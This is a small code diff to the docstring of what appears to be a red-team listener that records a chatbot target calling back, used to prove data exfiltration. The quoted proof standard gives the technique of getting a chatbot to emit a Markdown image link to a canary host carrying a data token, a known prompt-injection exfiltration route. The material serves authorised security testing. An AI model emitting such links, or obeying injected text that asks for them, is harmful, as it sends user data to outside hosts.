@@ -1,6 +1,6 @@
 """A listener that records the target phoning home, so exfiltration is provable.
 
-config/skills/llm-prompt-injection.md already states the proof standard for data
+The engagement skill file (not vendored here) states the proof standard for data
 exfiltration through a chatbot:
 
     If replies render Markdown/HTML, make it emit `![a](https://<canary-host>/p?d=<token>)`
